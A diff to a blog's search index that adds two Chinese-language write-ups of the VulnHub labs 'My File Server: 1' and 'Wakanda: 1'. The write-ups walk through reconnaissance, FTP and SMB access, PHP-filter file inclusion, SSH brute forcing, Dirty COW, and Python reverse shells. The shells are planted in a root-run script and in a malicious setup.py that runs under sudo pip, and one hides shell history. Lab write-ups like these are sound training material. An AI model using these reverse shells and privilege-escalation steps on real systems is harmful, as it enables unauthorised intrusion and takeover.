@@ -4,6 +4,64 @@
   
     
     <entry>
+      <title>MyFileServer-1</title>
+      <link href="/article/MyFileServer-1/"/>
+      <url>/article/MyFileServer-1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>My File Server: 1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/my-file-server-1,432/">vulnhub靶场-My File Server: 1</a></p><p>目标: get root</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.104</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line"></span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">2049/tcp open  nfs</span><br><span class="line">2121/tcp open  ccproxy-ftp</span><br></pre></td></tr></table></figure><p>再用<code>-A</code>进行详细扫描, 发现如下:</p><ul><li>21/ftp 允许匿名登录</li><li>2121/ftp 允许匿名登录</li><li>OS居然是windows, 可能是虚拟机</li></ul><p>http访问, 只有一个跳转链接, 甚至是卖课的; 利用目录扫描扫描到readme.txt, 内容如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">My Password is</span><br><span class="line">rootroot1</span><br></pre></td></tr></table></figure><p>利用cewl爬可用字符串, 爆破发现无用</p><p>ftp匿名登录, 两个都是日志信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.56.104</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure><p>尝试利用nfs挂载目录到本地, 失败; rpc更是只有信息无法利用; 那就只剩下445端口的smb服务辽</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看共享文件夹信息</span></span><br><span class="line">smbmap -H 192.168.56.104</span><br></pre></td></tr></table></figure><p>四个用户只有一个可以访问, 那就看看详细信息; 需要密码, 试了一下之前发现的<code>rootroot1</code>发现可以登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看详细信息</span></span><br><span class="line">smbclient //192.168.56.104/smbdata</span><br><span class="line">smbuser</span><br></pre></td></tr></table></figure><p>但是还是这个日志界面, 那就审计呗, 这一大堆日志</p><p>secure文件中新增了用户<code>smbuser</code>, 同时还有密码<code>chauthtok</code>, 但是根据sshd_config可得, 只能通过公钥登录</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>在测试ftp的时候发现利用<code>rootroot1</code>也可以登录<code>smbuser</code>的ftp, 且查看所在路径的时候是在<code>smbuser</code>用户目录下, 那就可以写公钥了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali在root权限生成rsa密钥对</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line"><span class="built_in">cd</span> /root/.ssh </span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;刚才id_rsa.pub的内容&#x27;</span> &gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在这个目录登录ftp</span></span><br><span class="line"><span class="built_in">mkdir</span> .ssh</span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line">put authorized_keys</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241219174546.png" alt="image.png"></p><p>此时再登录即可getshell</p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 3.10.0-229.el7.x86_64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">gcc -v</span><br><span class="line">python -h</span><br><span class="line"><span class="comment"># 查看特权文件, 没啥东西</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 自启动看看, 没东西</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br></pre></td></tr></table></figure><p>看看<code>/etc/passwd</code>, 没有其他用户; 这下只能用脚本跑了</p><p>测试了一堆还是脏牛好用, 编译后直接运行即可拿到flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件位置</span></span><br><span class="line">locate linux/local/40616.c </span><br><span class="line"><span class="comment"># 编译方式</span></span><br><span class="line">gcc 40616.c -o 40616 -pthread</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241219182001.png" alt="image.png"></p><p>最后flag在root文件夹下</p><blockquote><p>报错退出后不知道为什么运行不了第二次, 删掉<code>/tmp/bak</code>后, 运行<code>./40616 123456</code>又可以了</p><p>过一会就会 Broken pipe报错退出, 尽快完成</p></blockquote>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+            <tag> 信息收集 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Wakanda-1</title>
+      <link href="/article/Wakanda-1/"/>
+      <url>/article/Wakanda-1/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Wakanda: 1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/wakanda-1,251/">vulnhub靶场-Wakanda: 1</a></p><p>目标: Flags: There are three flags (flag1.txt, flag2.txt, root.txt)</p><p>提示: Follow your intuitions … and enumerate!</p><p>妙妙工具: <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><ul><li>kali: 192.168.56.5</li><li>target: 192.168.56.101</li></ul><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>nmap扫描得到靶机ip和对应信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line"></span><br><span class="line">80/tcp http</span><br><span class="line">111/tcp rpcbind</span><br><span class="line">3333/tcp dec-notes</span><br></pre></td></tr></table></figure><blockquote><p>其实测试后发现3333是ssh端口, 可以利用ssh链接</p></blockquote><p>http下手, 首先是网站下方有一个<code>Made by@mamadou</code>的描述, 可能是用户名</p><p>然后是查看源码, 给了如下提示:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;a class=&quot;nav-link active&quot; href=&quot;?lang=fr&quot;&gt;Fr/a&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>尝试给网站传参<code>?lang=fr</code>, 发现变成了法语网站, 那么这就是一个传参点, 等下看看有什么利用方法</p><p>目录扫描, 扫出来的访问都为空;</p><p>实在是没有其他的地方可以用了, 看看这个传参点能不能用</p><p>在测试了几类后, 猜测可能是文件包含; 因为当我访问<code>192.168.56.101/fr.php</code>的时候, 返回的并不是Not Found而是空白界面, 说明存在一个<code>fr.php</code>文件, 且传入<code>?lang=fr</code>的时候被首页包含了</p><p>所以我们尝试伪协议读取文件, 注意包含时自带后缀:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?lang=php://filter/convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218222336.png" alt="image.png"></p><p>如果你觉得还要解码比较麻烦, 就试试这个, 可以直接拿到源码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://192.168.247.152/?lang=php://filter/convert.base64-encode/resource=index | <span class="built_in">head</span> -n 1 | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure><p>现在我们拿到了密码<code>Niamey4Ever227!!!</code>, 不知道用户名, 比较简单的方法就是全部爬下来然后爆破</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl 192.168.56.101 -w 1.txt</span><br><span class="line">hydra -L 1.txt -p <span class="string">&#x27;Niamey4Ever227!!!&#x27;</span> ssh://192.168.56.101:3333</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218223543.png" alt="image.png"></p><p>得到账号密码: <code>mamadou : Niamey4Ever227!!!</code></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>ssh登录靶机, 登录后发现是python终端; 这时候使用我们的妙妙工具</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mamadou@192.168.56.101 -p 3333</span><br><span class="line"><span class="comment"># Niamey4Ever227!!!</span></span><br><span class="line">import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218223845.png" alt="image.png"></p><h2 id="信息收集-v2"><a class="header-anchor" href="#信息收集-v2">¶</a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 系统信息 Linux Wakanda1 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 内核版本 3.16.0-6-amd64</span></span><br><span class="line"><span class="built_in">uname</span> -r</span><br><span class="line"><span class="comment"># Debian GNU/Linux 8.11 (jessie)</span></span><br><span class="line">lsb_release -a</span><br><span class="line"><span class="comment"># 查看环境</span></span><br><span class="line">gcc -v</span><br></pre></td></tr></table></figure><p>没什么好说的, 看看怎么提权</p><p>首先在kali搜索, 发现没有什么可以用的, 那还是老老实实找flag吧</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Debian 8</span><br></pre></td></tr></table></figure><p>看看有没有其他用户(大于1000的就是用户):</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="comment"># devops</span></span><br></pre></td></tr></table></figure><p>看看有没有什么特权文件:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看特权文件, 没啥东西</span></span><br><span class="line">find / -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment"># mamadou用户可以访问的东西</span></span><br><span class="line">find / -user mamadou 2&gt;&amp;1 | grep -v <span class="string">&quot;Permission denied\|proc&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218225926.png" alt="image.png"></p><blockquote><p>那些44302的是我测试用的, 真没用别试了</p></blockquote><p>flag1抓出来看看: <code>Flag : d86b9ad71ca887f4dd1dac86ba1c4dfc</code></p><p>看看自己的<code>sudo -l</code>, 也没啥东西; 那就看看别的用户:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># devops用户可以访问的东西</span></span><br><span class="line">find / -user devops 2&gt;&amp;1 | grep -v <span class="string">&quot;Permission denied\|proc&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218230526.png" alt="image.png"></p><p>看看flag2, 发现Permission denied, 切换用户肯定无法直接su, 看看有没有别的文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/srv/.antivirus.py</span><br><span class="line">/tmp/test</span><br></pre></td></tr></table></figure><p>查看<code>/srv/.antivirus.py</code>, 发现是一个写test文件进/tmp目录的py程序, 去看看这个test</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218231258.png" alt="image.png"></p><p>发现这个文件的归属是devops, 而且时间也比较新, 不像是一直在这里的, 似乎是刚才生成的; 那可能就是有个文件一直在运行<code>/srv/.antivirus.py</code></p><p>找找文件:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 找关于antivirus的有关的有权限执行的文件</span></span><br><span class="line">find / -name *antivirus* 2&gt;/dev/null | grep -v <span class="string">&quot;permission denied\|proc&quot;</span></span><br><span class="line"><span class="comment"># /srv/.antivirus.py</span></span><br><span class="line"><span class="comment"># /lib/systemd/system/antivirus.service</span></span><br><span class="line"><span class="comment"># /etc/systemd/system/multi-user.target.wants/antivirus.service</span></span><br><span class="line"><span class="built_in">cat</span> /lib/systemd/system/antivirus.service</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218231535.png" alt="image.png"></p><p>每300s运行一次<code>/srv/.antivirus.py</code>, 我们对这个文件有写的权限, 那直接利用它进行反弹shell; 在文件后面</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano /srv/.antivirus.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># .antivirus.py</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.5&quot;</span>, <span class="number">5555</span>))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>等5min, 或者直接改那个文件, 让我们成功拿到devops的权限</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218232755.png" alt="image.png"></p><p>抓flag2的内容: <code>Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</code></p><p>看看<code>sudo -l</code>, 发现可以无需密码sudo执行<code>/usr/bin/pip</code></p><blockquote><p>在有些linux机器中, 某个用户拥有pip的sudo权限, 可以利用pip install进行本地提权;</p><p>在执行pip install时会调用<code>setup.py</code>，可以在创建<strong><a href="http://xn--setup-ll4jr8a.py">恶意setup.py</a></strong>文件来达到任意命令执行</p></blockquote><p>故技重施:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># setup.py</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.5&quot;</span>, <span class="number">7777</span>))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-i&quot;</span>])</span><br></pre></td></tr></table></figure><p>上传让靶机下载:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">python3 -m http.server 10000</span><br><span class="line"></span><br><span class="line"><span class="comment"># target</span></span><br><span class="line">wget http://192.168.56.5:10000/setup.py</span><br><span class="line"><span class="built_in">chmod</span> +x setup.py</span><br><span class="line">sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></table></figure><blockquote><p>这个命令用于用root权限安装或重新安装本地开发的Python包</p></blockquote><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218233828.png" alt="image.png"></p><p>现在去<code>/root</code>拿到最后一个flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20241218233942.png" alt="image.png"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">con</span>():</span><br><span class="line"><span class="keyword">import</span> socket, time,pty, os</span><br><span class="line">host=<span class="string">&#x27;192.168.247.129&#x27;</span></span><br><span class="line">port=<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.settimeout(<span class="number">10</span>)</span><br><span class="line">s.connect((host,port))</span><br><span class="line"></span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">os.putenv(<span class="string">&quot;HISTFILE&quot;</span>,<span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">s.close()</span><br><span class="line">con()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> vulnhub靶场 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 文件包含 </tag>
+            
+            <tag> PHP伪协议 </tag>
+            
+            <tag> Python反弹shell </tag>
+            
+            <tag> pip提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>HackLAB-Vulnix</title>
       <link href="/article/HackLAB-Vulnix/"/>
       <url>/article/HackLAB-Vulnix/</url>
@@ -55,11 +113,11 @@
             
             <tag> 漏洞利用 </tag>
             
+            <tag> 信息收集 </tag>
+            
             <tag> SQL注入 </tag>
             
             <tag> 文件包含 </tag>
-            
-            <tag> 信息收集 </tag>
             
             <tag> 文件删除 </tag>
             
@@ -142,6 +200,8 @@
             
             <tag> 绕过 </tag>
             
+            <tag> 文件包含 </tag>
+            
             <tag> SSRF </tag>
             
             <tag> 代码审计 </tag>
@@ -149,8 +209,6 @@
             <tag> 异形URL </tag>
             
             <tag> DNS重定向攻击 </tag>
-            
-            <tag> 文件包含 </tag>
             
             <tag> gopher伪协议 </tag>
             
@@ -1423,9 +1481,9 @@
             
             <tag> 工具利用 </tag>
             
-            <tag> PHP </tag>
-            
             <tag> 信息收集 </tag>
+            
+            <tag> PHP </tag>
             
         </tags>
       
